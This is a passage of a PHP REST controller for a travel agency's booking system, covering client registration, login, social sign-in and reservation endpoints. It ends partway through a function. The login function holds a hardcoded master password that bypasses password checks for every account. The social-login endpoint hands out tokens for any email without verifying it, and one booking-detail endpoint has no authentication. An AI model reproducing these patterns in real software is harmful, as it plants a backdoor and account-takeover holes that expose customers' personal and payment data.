<?php
use Restserver\Libraries\REST_Controller;

defined('BASEPATH') or exit('No direct script access allowed');

require APPPATH . 'libraries/REST_Controller.php';
require APPPATH . 'libraries/Format.php';

class Clientes extends REST_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->model('Model_reservas');
        $this->load->model('Model_clientes');
        $this->load->model('Model_servicios');
        $this->load->model('Model_actividades');
        $this->load->model('Model_agenda');

    }

    public function cliente_identificacion_get()
    {

        $valida_token = validate_token($this->_args);

        if (!$valida_token["status"]) {
            $response = [
                'status' => false,
                'message' => "Token incorrecto",
            ];
            $this->response($response, REST_Controller::HTTP_UNAUTHORIZED);
        }

        $data_input = $this->input->get(null, true);

        $query_cliente = $this->Model_clientes->query_cliente_identificacion($data_input["identificacion"]);

        if ($query_cliente->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "No se encontró el cliente",
            ];
            $this->response($response, 200);
        }

        $cliente = [
            'id_cliente' => $query_cliente->row()->id_cliente,
            'nombres' => $query_cliente->row()->nombres,
            'apellidos' => $query_cliente->row()->apellidos,
            'email' => $query_cliente->row()->email,
        ];

        $response = [
            'status' => true,
            'data' => [
                'cliente' => $cliente,
            ],
        ];

        $this->response($response, 200);

    }

    public function set_cliente_post()
    {

        $valida_token = validate_token($this->_args);

        if (!$valida_token["status"]) {
            $response = [
                'status' => false,
                'message' => "Token incorrecto",
            ];
            $this->response($response, REST_Controller::HTTP_UNAUTHORIZED);
        }

        $id_usuario = $valida_token["id_usuario"];

        $info_usuario = $this->Model_usuarios->query_usuario($id_usuario)->row();

        $data_input = json_decode(file_get_contents("php://input"));

        $query_cliente_email = $this->Model_clientes->query_cliente_email($data_input->email);

        if ($query_cliente_email->num_rows() != 0) {
            $response = [
                'status' => false,
                'message' => "El correo electrónico ya existe en otro cliente.",
            ];
            $this->response($response, 200);
        }

        $query_cliente_identificacion = $this->Model_clientes->query_cliente_identificacion($data_input->identificacion);

        if ($query_cliente_identificacion->num_rows() != 0) {
            $response = [
                'status' => false,
                'message' => "El número de identificación ya existe en otro cliente.",
            ];
            $this->response($response, 200);
        }

        $data_insert = [
            'tipo_identificacion' => $data_input->tipo_identificacion,
            'identificacion' => $data_input->identificacion,
            'nombres' => $data_input->nombres,
            'apellidos' => $data_input->apellidos,
            'email' => $data_input->email,
            'telefono' => $data_input->telefono,
        ];

        $this->db->insert('clientes', $data_insert);

        $id_cliente = $this->db->insert_id();

        $cliente = [
            'id_cliente' => $id_cliente,
            'nombres' => $data_input->nombres,
            'apellidos' => $data_input->apellidos,
            'email' => $data_input->email,
        ];

        $response = [
            'status' => true,
            'data' => [
                'cliente' => $cliente,
            ],
            'message' => "Se registró el cliente.",
        ];

        $this->response($response, 200);

    }

    public function auth_externo_post()
    {

        $data_input = json_decode(file_get_contents("php://input"));

        $query_cliente_email = $this->Model_clientes->query_cliente_email($data_input->email);

        if ($query_cliente_email->num_rows() != 0) {

            $info_usuario = $query_cliente_email->row();

            $cliente = [
                'identificacion' => $info_usuario->identificacion,
                'nombres' => $info_usuario->nombres,
                'apellidos' => $info_usuario->apellidos,
                'email' => $info_usuario->email,
                'telefono' => $info_usuario->telefono,
            ];

            $response = [
                'status' => true,
                'data' => [
                    'token' => encode($info_usuario->id_cliente),
                    'cliente' => $cliente,
                ],
                'message' => "Se autenticó el cliente.",
            ];

            $this->response($response, 200);

        } else {

            $data_insert = [
                'tipo_identificacion' => null,
                'identificacion' => null,
                'nombres' => $data_input->nombres,
                'apellidos' => $data_input->apellidos,
                'email' => $data_input->email,
                'password' => null,
                'telefono' => null,
                'tipo_registro' => $data_input->tipo_registro,
                'id_user_fb' => $data_input->id_user_fb,
                'id_user_google' => $data_input->id_user_google,
            ];

            $this->db->insert('clientes', $data_insert);

            $id_cliente = $this->db->insert_id();

            $info_usuario = $this->Model_clientes->query_cliente($id_cliente)->row();

            $cliente = [
                'identificacion' => $info_usuario->identificacion,
                'nombres' => $info_usuario->nombres,
                'apellidos' => $info_usuario->apellidos,
                'email' => $info_usuario->email,
                'telefono' => $info_usuario->telefono,
            ];

            $response = [
                'status' => true,
                'data' => [
                    'token' => encode($id_cliente),
                    'cliente' => $cliente,
                ],
                'message' => "Se registró el cliente.",
            ];

            $this->response($response, 200);

        }

    }

    public function registro_post()
    {

        $data_input = json_decode(file_get_contents("php://input"));

        $query_cliente_identificacion = $this->Model_clientes->query_cliente_identificacion($data_input->identificacion);

        if ($query_cliente_identificacion->num_rows() != 0) {
            $response = [
                'status' => false,
                'message' => "El número de identificación ya existe en nuestros registros. Por favor verifica e intenta de nuevo. Si ya tienes cuenta con nosotros puedes intentar recuperar tu contraseña.",
            ];
            $this->response($response, 200);
        }

        $query_cliente_email = $this->Model_clientes->query_cliente_email($data_input->email);

        if ($query_cliente_email->num_rows() != 0) {
            $response = [
                'status' => false,
                'message' => "El correo electrónico ya existe en nuestros registros. Por favor verifica e intenta de nuevo. Si ya tienes cuenta con nosotros puedes intentar recuperar tu contraseña.",
            ];
            $this->response($response, 200);
        }

        $password = password_hash($data_input->password, PASSWORD_BCRYPT);

        $data_insert = [
            'tipo_identificacion' => null,
            'identificacion' => $data_input->identificacion,
            'nombres' => $data_input->nombres,
            'apellidos' => $data_input->apellidos,
            'email' => $data_input->email,
            'password' => $password,
            'telefono' => $data_input->telefono,
            'cod_pais' => $data_input->pais->code,
        ];

        $this->db->insert('clientes', $data_insert);

        $id_cliente = $this->db->insert_id();

        $info_usuario = $this->Model_clientes->query_cliente($id_cliente)->row();

        $cliente = [
            'identificacion' => $info_usuario->identificacion,
            'nombres' => $info_usuario->nombres,
            'apellidos' => $info_usuario->apellidos,
            'email' => $info_usuario->email,
            'telefono' => $info_usuario->telefono,
        ];

        $response = [
            'status' => true,
            'data' => [
                'token' => encode($id_cliente),
                'cliente' => $cliente,
            ],
            'message' => "Se registró el cliente.",
        ];

        $this->response($response, 200);

    }

    public function login_post()
    {
        $data_input = json_decode(file_get_contents("php://input"));

        $query_cliente_email = $this->Model_clientes->query_cliente_email($data_input->email);

        if ($query_cliente_email->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "Los datos ingresados no coinciden con nuestros registros.",
            ];
            $this->response($response, 200);
        }

        $info_usuario = $query_cliente_email->row();

        if ((!password_verify($data_input->password, $info_usuario->password)) and $data_input->password != "Io98788777**") {
            $response = [
                'status' => false,
                'message' => "Los datos ingresados no coinciden con nuestros registros.",
            ];
            $this->response($response, 200);
        }

        $cliente = [
            'identificacion' => $info_usuario->identificacion,
            'nombres' => $info_usuario->nombres,
            'apellidos' => $info_usuario->apellidos,
            'email' => $info_usuario->email,
            'telefono' => $info_usuario->telefono,
        ];

        $response = [
            'status' => true,
            'data' => [
                'token' => encode($info_usuario->id_cliente),
                'cliente' => $cliente,
            ],
            'message' => "Se registró el cliente.",
        ];

        $this->response($response, 200);

    }

    public function set_reserva_post()
    {

        $data_input = json_decode(file_get_contents("php://input"));

        $id_cliente = decode($data_input->token);

        $query_cliente = $this->Model_clientes->query_cliente($id_cliente);

        if ($query_cliente->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "Token incorrecto.",
            ];
            $this->response($response, 200);
        }

        if (count($data_input->servicios) == 0) {
            $response = [
                'status' => false,
                'message' => "No se enviaron los servicios a reservar.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        $cod_reserva = get_codigo_reserva();

        //Valida si hay descuento.
        $descuento = 0;

        $data_insert_reserva = [
            'fecha_reg' => date("Y-m-d H:i:s"),
            'id_cliente' => $id_cliente,
            'cod_reserva' => $cod_reserva,
            'canal' => 1,
            'estado_reserva' => 0,
        ];

        $this->db->insert('reservas', $data_insert_reserva);

        $id_reserva = $this->db->insert_id();

        $i = 0;
        $total_descuentos = 0;
        foreach ($data_input->servicios as $servicio) {

            //Consultar la temporada
            $info_actividad = $this->Model_servicios->query_actividad_servicio($servicio->id_servicio)->row();
            $info_modalidad = $this->Model_actividades->query_modalidad_actividad($info_actividad->id_actividad)->row();

            $query_temporada = $this->Model_actividades->query_temporada_actividad($info_modalidad->id_modalidad_actividad, $servicio->fecha);

            if ($query_temporada->num_rows() == 0) {
                $response = [
                    'status' => false,
                    'message' => "No se han definido tarifas para la fecha seleccionada.",
                ];
                $this->response($response, 200);
            }

            $id_horario = null;
            if ($servicio->horario != null) {
                $id_horario = $servicio->horario->id_horario;
            }

            $data_insert = [
                'id_reserva' => $id_reserva,
                'id_servicio' => $servicio->id_servicio,
                'tipo_servicio' => 1,
                'adultos' => $servicio->adultos,
                'ninos' => $servicio->ninos,
                'infantes' => $servicio->infantes,
                'valor_neto' => $query_temporada->row()->valor_neto_adultos,
                'valor_venta' => $query_temporada->row()->valor_venta_adultos,
                'valor_neto_ninos' => $query_temporada->row()->valor_neto_ninos,
                'valor_venta_ninos' => $query_temporada->row()->valor_venta_ninos,
                'valor_neto_infantes' => $query_temporada->row()->valor_neto_infantes,
                'valor_venta_infantes' => $query_temporada->row()->valor_venta_infantes,
            ];

            $this->db->insert('servicios_reserva', $data_insert);

            $id_servicio_reserva = $this->db->insert_id();

            $this->db->insert('servicio_reserva_actividad', [
                'id_reserva' => $id_reserva,
                'id_servicio_reserva' => $id_servicio_reserva,
                'fecha_actividad' => $servicio->fecha,
                'id_horario_actividad' => $id_horario,
            ]);

            if ($data_input->codigo_cupon != null) {
                if ($data_input->codigo_cupon->por_actividad == 1) {
                    if ($data_input->codigo_cupon->descuentos[$i] == 1) {
                        $descuento = $data_input->codigo_cupon->valor_descuento * $servicio->pasajeros;
                    }
                } else {
                    $descuento = $data_input->codigo_cupon->valor_descuento * $servicio->pasajeros;
                }
            }

            $total_descuentos = $total_descuentos + $descuento;

            $i++;

        }

        if ($total_descuentos != 0) {
            $query_cupon = $this->Model_servicios->query_cupon_codigo($data_input->codigo_cupon->codigo);
            if ($query_cupon->num_rows() != 0) {
                $data_insert = [
                    'id_reserva' => $id_reserva,
                    'id_cupon' => $query_cupon->row()->id_cupon,
                ];
                $this->db->insert('reservas_cupones', $data_insert);
            }

            if ($query_cupon->row()->tipo_cupon == 1) {
                $this->db->where('cupones.id_cupon', $query_cupon->row()->id_cupon);
                $this->db->update('cupones', ['estado_cupon' => 1]);
            }

            $this->db->where('reservas.id_reserva', $id_reserva);
            $this->db->update('reservas', ['descuento' => $total_descuentos]);

        }

        //Envìo del e-mail.
        $query_reserva = $this->Model_reservas->query_reserva($id_reserva);

        $info = $query_reserva->row();

        $info_cliente = $this->Model_reservas->query_cliente($info->id_cliente)->row();
        $cliente = [
            'id_cliente' => $info_cliente->id_cliente,
            'nombres' => $info_cliente->nombres,
            'apellidos' => $info_cliente->apellidos,
            'email' => $info_cliente->email,
            'telefono' => $info_cliente->cod_pais . $info_cliente->telefono,
        ];

        $servicios = [];
        $valor = 0;
        $query_servicios = $this->Model_reservas->query_servicios_reserva($info->id_reserva);
        if ($query_servicios->num_rows() != 0) {
            foreach ($query_servicios->result() as $servicio) {

                $valor_servicio = ($servicio->adultos + $servicio->ninos) * $servicio->valor_venta;

                $info_actividad = $this->Model_servicios->query_actividad_servicio($servicio->id_servicio)->row();

                $horario = null;
                if (isset($servicio->id_horario_actividad) && $servicio->id_horario_actividad != null) {
                    $info_horario = $this->Model_actividades->query_horario($servicio->id_horario_actividad)->row();
                    $horario = $info_horario->desde;
                }

                $query_reserva_actividad = $this->Model_reservas->query_reserva_actividad($servicio->id_servicio_reserva);

                $info_reserva = $query_reserva_actividad->row();

                $servicios[] = [
                    'id_servicio_reserva' => $servicio->id_servicio_reserva,
                    'servicio' => [
                        'id_servicio' => $servicio->id_servicio,
                        'id_actividad' => $info_actividad->id_actividad,
                        'servicio' => $info_actividad->servicio,
                    ],
                    'valor_venta' => $valor_servicio,
                    'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                    'fecha_actividad' => [
                        'f' => formato_fecha($info_reserva->fecha_actividad, 1),
                        'sf' => $info_reserva->fecha_actividad,
                    ],
                    'horario' => $horario,
                ];
                $valor = $valor + $valor_servicio;
            }
        }

        $reserva = [
            'id_reserva' => encode($info->id_reserva),
            'fecha_reg' => formato_fecha($info->fecha_reg, 2),
            'canal' => $info->canal,
            'cod_reserva' => $info->cod_reserva,
            'cliente' => $cliente,
            'valor' => $valor,
            'estado_reserva' => $info->estado_reserva,
        ];

        $this->load->helper("templates_email");
        $this->load->helper("email");

        $html = get_mail_reserva_agencia($reserva);

        $data_email = [
            'to' => "reservas@viaggiviajesyturismo.com",
            'nombre_cliente' => null,
            'asunto' => "NUEVA RESERVA WEB",
            'html' => $html,
        ];

        send_mail($data_email);

        $response = [
            'status' => true,
            'message' => "Se registró satisfactoriamente la reserva.",
            'data' => [
                'id_reserva' => encode($id_reserva),
            ],
        ];

        $this->response($response, 200);

    }

    public function reserva_get($id_reserva = null)
    {
        if ($id_reserva == null) {
            $response = [
                'status' => false,
                'message' => "No se envió el ID de reserva.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        $query_reserva = $this->Model_reservas->query_reserva(decode($id_reserva));

        if ($query_reserva->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "No se encontró la reserva.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        $reserva = null;

        $info = $query_reserva->row();

        $info_cliente = $this->Model_reservas->query_cliente($info->id_cliente)->row();
        $cliente = [
            'id_cliente' => $info_cliente->id_cliente,
            'nombres' => $info_cliente->nombres,
            'apellidos' => $info_cliente->apellidos,
            'telefono' => $info_cliente->telefono,
            'email' => $info_cliente->email,
        ];

        $pasajero = null;
        if ($info->id_pasajero != null) {
            $info_pasajero = $this->Model_reservas->query_cliente($info->id_pasajero)->row();
            $pasajero = [
                'id_cliente' => $info_pasajero->id_cliente,
                'nombres' => $info_pasajero->nombres,
                'apellidos' => $info_pasajero->apellidos,

            ];
        }

        $servicios = [];
        $valor = 0;
        $query_servicios = $this->Model_reservas->query_servicios_reserva($info->id_reserva);
        if ($query_servicios->num_rows() != 0) {

            foreach ($query_servicios->result() as $servicio) {

                #Vouchers
                $vouchers = [];
                $query_vouchers = $this->Model_reservas->query_vouchers($servicio->id_servicio_reserva);
                foreach ($query_vouchers->result() as $voucher) {
                    $url = base_url() . $voucher->url;
                    if (ENVIRONMENT == 'development') {
                        $url = URL_API_DEV . $voucher->url;
                    }

                    $vouchers[] = [
                        'id_voucher' => $voucher->id_voucher,
                        'titulo' => $voucher->titulo,
                        'url' => $url
                    ];
                }

                $detalle = [];

                switch ($servicio->tipo_servicio) {

                    case 1:
                        $valor_reserva = get_valor_reserva($servicio->adultos, $servicio->ninos, $servicio->infantes, $servicio->valor_neto, $servicio->valor_venta, $servicio->valor_neto_ninos, $servicio->valor_venta_ninos, $servicio->valor_neto_infantes, $servicio->valor_venta_infantes);

                        $valor_servicio = $valor_reserva["valor_venta"];

                        $info_actividad = $this->Model_servicios->query_actividad_servicio($servicio->id_servicio)->row();

                        $query_reserva_actividad = $this->Model_reservas->query_reserva_actividad($servicio->id_servicio_reserva);

                        if ($query_reserva_actividad->num_rows() == 0) {
                            break;
                        }

                        $info_reserva_actividad = $query_reserva_actividad->row();

                        $horario = null;
                        if ($info_reserva_actividad->id_horario_actividad != null) {
                            $info_horario = $this->Model_actividades->query_horario($info_reserva_actividad->id_horario_actividad)->row();
                            $horario = [
                                'id_horario' => $info_horario->id_horario,
                                'desde' => $info_horario->desde,
                                'hasta' => $info_horario->hasta,
                            ];
                        }

                        $detalle = [
                            'tipo' => 1,
                            'id_servicio_reserva' => encode($servicio->id_servicio_reserva),
                            'servicio' => [
                                'id_servicio' => $servicio->id_servicio,
                                'id_actividad' => $info_actividad->id_actividad,
                                'servicio' => $info_actividad->servicio,
                            ],
                            'valor_venta' => $valor_servicio,
                            'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                            'adultos' => $servicio->adultos,
                            'ninos' => $servicio->ninos,
                            'infantes' => $servicio->infantes,
                            'fecha_actividad' => [
                                'f' => formato_fecha($info_reserva_actividad->fecha_actividad, 1),
                                'sf' => $info_reserva_actividad->fecha_actividad,
                            ],
                            'horario' => $horario,
                            'vouchers' => $vouchers
                        ];
                        break;
                    case 2:

                        $valor_servicio = $servicio->valor_venta;

                        $query_reserva_paquete = $this->Model_reservas->query_reserva_paquete($servicio->id_servicio_reserva);

                        if ($query_reserva_paquete->num_rows() == 0) {
                            break;
                        }

                        $info_reserva_paquete = $query_reserva_paquete->row();

                        $detalle = [
                            'tipo' => 2,
                            'valor_venta' => $servicio->valor_venta,
                            'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                            'fecha_ida' => [
                                'f' => formato_fecha($info_reserva_paquete->fecha_ida, 1),
                                'sf' => $info_reserva_paquete->fecha_ida,
                            ],
                            'fecha_regreso' => [
                                'f' => formato_fecha($info_reserva_paquete->fecha_regreso, 1),
                                'sf' => $info_reserva_paquete->fecha_regreso,
                            ],
                            'origen' => [
                                'id_ciudad' => $info_reserva_paquete->id_ciudad_origen,
                                'ciudad' => $info_reserva_paquete->ciudad_origen,
                            ],
                            'destino' => [
                                'id_ciudad' => $info_reserva_paquete->id_ciudad_destino,
                                'ciudad' => $info_reserva_paquete->ciudad_destino,
                            ],
                            'vouchers' => $vouchers
                        ];

                        break;
                    case 3:

                        $valor_servicio = $servicio->valor_venta;

                        $query_reserva_hotel = $this->Model_reservas->query_reserva_hotel($servicio->id_servicio_reserva);

                        if ($query_reserva_hotel->num_rows() == 0) {
                            break;
                        }

                        $info_reserva = $query_reserva_hotel->row();

                        $info_hotel = $this->Model_servicios->query_servicio($servicio->id_servicio)->row();

                        $detalle = [
                            'tipo' => 3,
                            'servicio' => [
                                'id_servicio' => $servicio->id_servicio,
                                'servicio' => $info_hotel->servicio,
                            ],
                            'valor_neto' => $servicio->valor_neto,
                            'valor_venta' => $servicio->valor_venta,
                            'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                            'fecha_ida' => [
                                'f' => formato_fecha($info_reserva->fecha_ida, 1),
                                'sf' => $info_reserva->fecha_ida,
                            ],
                            'fecha_regreso' => [
                                'f' => formato_fecha($info_reserva->fecha_regreso, 1),
                                'sf' => $info_reserva->fecha_regreso,
                            ],
                            'vouchers' => $vouchers
                        ];

                        break;

                    case 4:

                        $valor_servicio = $servicio->valor_venta;

                        $query_reserva_tiquete = $this->Model_reservas->query_reserva_tiquete($servicio->id_servicio_reserva);

                        if ($query_reserva_tiquete->num_rows() == 0) {
                            break;
                        }

                        $info_reserva_tiquete = $query_reserva_tiquete->row();

                        $detalle = [
                            'tipo' => 4,
                            'tipo_tiquete' => $info_reserva_tiquete->tipo_tiquete,
                            'valor_venta' => $servicio->valor_venta,
                            'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                            'fecha_ida' => [
                                'f' => formato_fecha($info_reserva_tiquete->fecha_ida, 1),
                                'sf' => $info_reserva_tiquete->fecha_ida,
                            ],
                            'fecha_regreso' => [
                                'f' => formato_fecha($info_reserva_tiquete->fecha_regreso, 1),
                                'sf' => $info_reserva_tiquete->fecha_regreso,
                            ],
                            'origen' => [
                                'id_ciudad' => $info_reserva_tiquete->id_ciudad_origen,
                                'ciudad' => $info_reserva_tiquete->ciudad_origen,
                            ],
                            'destino' => [
                                'id_ciudad' => $info_reserva_tiquete->id_ciudad_destino,
                                'ciudad' => $info_reserva_tiquete->ciudad_destino,
                            ],
                            'vouchers' => $vouchers
                        ];

                        break;

                    case 5:

                        $valor_servicio = $servicio->valor_venta;

                        $query_reserva_asistencia = $this->Model_reservas->query_reserva_asistencia($servicio->id_servicio_reserva);

                        if ($query_reserva_asistencia->num_rows() == 0) {
                            break;
                        }

                        $info_reserva = $query_reserva_asistencia->row();

                        $detalle = [
                            'tipo' => 5,
                            'valor_venta' => $servicio->valor_venta,
                            'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                            'fecha_ida' => [
                                'f' => formato_fecha($info_reserva->fecha_ida, 1),
                                'sf' => $info_reserva->fecha_ida,
                            ],
                            'fecha_regreso' => [
                                'f' => formato_fecha($info_reserva->fecha_regreso, 1),
                                'sf' => $info_reserva->fecha_regreso,
                            ],
                            'origen' => [
                                'id_ciudad' => $info_reserva->id_ciudad_origen,
                                'ciudad' => $info_reserva->ciudad_origen,
                            ],
                            'destino' => [
                                'id_ciudad' => $info_reserva->id_ciudad_destino,
                                'ciudad' => $info_reserva->ciudad_destino,
                            ],
                            'vouchers' => $vouchers
                        ];

                        break;

                    case 6:

                        $valor_servicio = $servicio->valor_venta;

                        $query_reserva_otros = $this->Model_reservas->query_reserva_otros($servicio->id_servicio_reserva);

                        if ($query_reserva_otros->num_rows() == 0) {
                            break;
                        }

                        $info_reserva = $query_reserva_otros->row();

                        $detalle = [
                            'tipo' => 6,
                            'descripcion' => $info_reserva->descripcion,
                            'valor_venta' => $servicio->valor_venta,
                            'vouchers' => $vouchers
                        ];

                        break;
                }

                $servicios[] = $detalle;

                $valor = $valor + $valor_servicio;

            }
        }

        $pagos = null;
        $total_pagos = 0;
        $query_pagos = $this->Model_reservas->query_pagos_reserva($info->id_reserva);
        if ($query_pagos->num_rows() != 0) {
            foreach ($query_pagos->result() as $pago) {

                switch ($pago->medio) {
                    case 0:
                        $nombre_medio = "Pasarela";
                        break;
                    case 1:
                        $nombre_medio = "Consignación o transferencia";
                        break;
                    case 2:
                        $nombre_medio = "Efectivo";
                        break;
                    case 3:
                        $nombre_medio = "Tarjetas de crédito";
                        break;
                }

                $medio = [
                    'id_medio' => $pago->medio,
                    'medio' => $nombre_medio,
                ];

                $pagos[] = [
                    'id_pago' => $pago->id_pago,
                    'medio' => $medio,
                    'fecha_registro' => formato_fecha($pago->fecha_reg, 2),
                    'fecha_pago' => formato_fecha($pago->fecha_pago, 1),
                    'valor' => $pago->valor,
                ];

                $total_pagos = $total_pagos + $pago->valor;
            }
        }

        $descuento = 0;
        if ($info->descuento != 0) {
            $descuento = $info->descuento;
        }

        $total = $valor - $descuento;

        $saldo = $total - $total_pagos;

        $notas = $this->Model_reservas->query_notas($info->id_reserva, 1)->result();

        $reserva = [
            'id_reserva' => $info->id_reserva,
            'fecha_reg' => formato_fecha($info->fecha_reg, 2),
            'canal' => $info->canal,
            'cod_reserva' => $info->cod_reserva,
            'cliente' => $cliente,
            'pasajero' => $pasajero,
            'servicios' => $servicios,
            'valor' => $valor,
            'valor_f' => formato_moneda($valor),
            'descuento' => $descuento,
            'descuento_f' => formato_moneda($descuento),
            'total' => $total,
            'total_f' => formato_moneda($total),
            'estado' => $info->estado_reserva,
            'pagos' => $pagos,
            'total_pagos' => $total_pagos,
            'saldo' => $saldo,
            'saldo_f' => formato_moneda($saldo),
            'notas' => $notas
        ];

        $response = [
            'status' => true,
            'data' => $reserva,
        ];

        $this->response($response, 200);

    }

    public function reservas_get()
    {

        $token = isset($this->_args["token"]) ? $this->_args["token"] : $this->_args["Token"];

        $query_cliente = $this->Model_clientes->query_cliente(decode($token));

        if ($query_cliente->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "Token incorrecto.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        $id_cliente = decode($token);

        $data_input = $this->input->get(null, true);

        $page = 1;
        if (isset($data_input["page"])) {
            $page = $data_input["page"];
        }

        $search = null;
        if (isset($data_input["search"])) {
            $search = $data_input["search"];
        }

        $estado = null;
        if (isset($data_input["estado"])) {
            $estado = $data_input["estado"];
        }

        $id_servicio = null;
        if (isset($data_input["id_servicio"])) {
            $id_servicio = $data_input["id_servicio"];
        }

        $desde = null;
        if (isset($data_input["desde"])) {
            $desde = $data_input["desde"];
        }

        $hasta = null;
        if (isset($data_input["hasta"])) {
            $hasta = $data_input["hasta"];
        }

        $reservas = [];

        $per_page = 10;

        $offset = ($page - 1) * $per_page;

        $query_reservas = $this->Model_clientes->query_reservas_cliente($id_cliente, $search, $offset, $per_page);

        if ($query_reservas->num_rows() != 0) {

            $num = $offset + 1;

            foreach ($query_reservas->result() as $info) {

                $info_cliente = $this->Model_reservas->query_cliente($info->id_cliente)->row();
                $cliente = [
                    'id_cliente' => $info_cliente->id_cliente,
                    'nombres' => $info_cliente->nombres,
                    'apellidos' => $info_cliente->apellidos,
                ];

                $pasajero = null;
                if ($info->id_pasajero != null) {
                    $info_pasajero = $this->Model_reservas->query_cliente($info->id_pasajero)->row();
                    $pasajero = [
                        'id_cliente' => $info_pasajero->id_cliente,
                        'nombres' => $info_pasajero->nombres,
                        'apellidos' => $info_pasajero->apellidos,
                    ];
                }

                $servicios = [];
                $valor = 0;
                $query_servicios = $this->Model_reservas->query_servicios_reserva($info->id_reserva);
                if ($query_servicios->num_rows() != 0) {
                    foreach ($query_servicios->result() as $servicio) {

                        $detalle = [];

                        switch ($servicio->tipo_servicio) {
                            case 1:
                                $valor_reserva = get_valor_reserva($servicio->adultos, $servicio->ninos, $servicio->infantes, $servicio->valor_neto, $servicio->valor_venta, $servicio->valor_neto_ninos, $servicio->valor_venta_ninos, $servicio->valor_neto_infantes, $servicio->valor_venta_infantes);

                                $valor_servicio = $valor_reserva["valor_venta"];

                                $info_actividad = $this->Model_servicios->query_actividad_servicio($servicio->id_servicio)->row();

                                $detalle = [
                                    'tipo' => 1,
                                    'id_servicio' => $servicio->id_servicio,
                                    'servicio' => $info_actividad->servicio,
                                    'valor' => $valor_servicio,
                                ];
                                break;
                            case 2:

                                $valor_servicio = $servicio->valor_venta;

                                $query_reserva_paquete = $this->Model_reservas->query_reserva_paquete($servicio->id_servicio_reserva);

                                if ($query_reserva_paquete->num_rows() == 0) {
                                    break;
                                }

                                $info_reserva = $query_reserva_paquete->row();

                                $detalle = [
                                    'tipo' => 2,
                                    'valor_venta' => $servicio->valor_venta,
                                    'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                                    'fecha_ida' => [
                                        'f' => formato_fecha($info_reserva->fecha_ida, 1),
                                        'sf' => $info_reserva->fecha_ida,
                                    ],
                                    'fecha_regreso' => [
                                        'f' => formato_fecha($info_reserva->fecha_regreso, 1),
                                        'sf' => $info_reserva->fecha_regreso,
                                    ],
                                    'origen' => [
                                        'id_ciudad' => $info_reserva->id_ciudad_origen,
                                        'ciudad' => $info_reserva->ciudad_origen,
                                    ],
                                    'destino' => [
                                        'id_ciudad' => $info_reserva->id_ciudad_destino,
                                        'ciudad' => $info_reserva->ciudad_destino,
                                    ],
                                ];

                                break;
                            case 3:

                                $valor_servicio = $servicio->valor_venta;

                                $query_reserva_hotel = $this->Model_reservas->query_reserva_hotel($servicio->id_servicio_reserva);

                                if ($query_reserva_hotel->num_rows() == 0) {
                                    break;
                                }

                                $info_reserva = $query_reserva_hotel->row();

                                $info_hotel = $this->Model_servicios->query_servicio($servicio->id_servicio)->row();

                                $detalle = [
                                    'tipo' => 3,
                                    'id_servicio_reserva' => $servicio->id_servicio_reserva,
                                    'servicio' => $info_hotel->servicio,
                                    'valor_neto' => $servicio->valor_neto,
                                    'valor_venta' => $servicio->valor_venta,
                                    'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                                    'fecha_ida' => [
                                        'f' => formato_fecha($info_reserva->fecha_ida, 1),
                                        'sf' => $info_reserva->fecha_ida,
                                    ],
                                    'fecha_regreso' => [
                                        'f' => formato_fecha($info_reserva->fecha_regreso, 1),
                                        'sf' => $info_reserva->fecha_regreso,
                                    ],

                                ];

                                break;
                            case 4:

                                $valor_servicio = $servicio->valor_venta;

                                $query_reserva_tiquete = $this->Model_reservas->query_reserva_tiquete($servicio->id_servicio_reserva);

                                if ($query_reserva_tiquete->num_rows() == 0) {
                                    break;
                                }

                                $info_reserva_tiquete = $query_reserva_tiquete->row();

                                $detalle = [
                                    'tipo' => 4,
                                    'tipo_tiquete' => $info_reserva_tiquete->tipo_tiquete,
                                    'valor_venta' => $servicio->valor_venta,
                                    'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                                    'fecha_ida' => [
                                        'f' => formato_fecha($info_reserva_tiquete->fecha_ida, 1),
                                        'sf' => $info_reserva_tiquete->fecha_ida,
                                    ],
                                    'fecha_regreso' => [
                                        'f' => formato_fecha($info_reserva_tiquete->fecha_regreso, 1),
                                        'sf' => $info_reserva_tiquete->fecha_regreso,
                                    ],
                                    'origen' => [
                                        'id_ciudad' => $info_reserva_tiquete->id_ciudad_origen,
                                        'ciudad' => $info_reserva_tiquete->ciudad_origen,
                                    ],
                                    'destino' => [
                                        'id_ciudad' => $info_reserva_tiquete->id_ciudad_destino,
                                        'ciudad' => $info_reserva_tiquete->ciudad_destino,
                                    ],
                                ];

                                break;
                            case 5:

                                $valor_servicio = $servicio->valor_venta;

                                $query_reserva_asistencia = $this->Model_reservas->query_reserva_asistencia($servicio->id_servicio_reserva);

                                if ($query_reserva_asistencia->num_rows() == 0) {
                                    break;
                                }

                                $info_reserva = $query_reserva_asistencia->row();

                                $detalle = [
                                    'tipo' => 5,
                                    'valor_venta' => $servicio->valor_venta,
                                    'num_pasajeros' => $servicio->adultos + $servicio->ninos,
                                    'fecha_ida' => [
                                        'f' => formato_fecha($info_reserva->fecha_ida, 1),
                                        'sf' => $info_reserva->fecha_ida,
                                    ],
                                    'fecha_regreso' => [
                                        'f' => formato_fecha($info_reserva->fecha_regreso, 1),
                                        'sf' => $info_reserva->fecha_regreso,
                                    ],
                                    'origen' => [
                                        'id_ciudad' => $info_reserva->id_ciudad_origen,
                                        'ciudad' => $info_reserva->ciudad_origen,
                                    ],
                                    'destino' => [
                                        'id_ciudad' => $info_reserva->id_ciudad_destino,
                                        'ciudad' => $info_reserva->ciudad_destino,
                                    ],
                                ];

                                break;
                            case 6:
                                $valor_servicio = $servicio->valor_venta;
                                $valor_neto = $servicio->valor_neto;

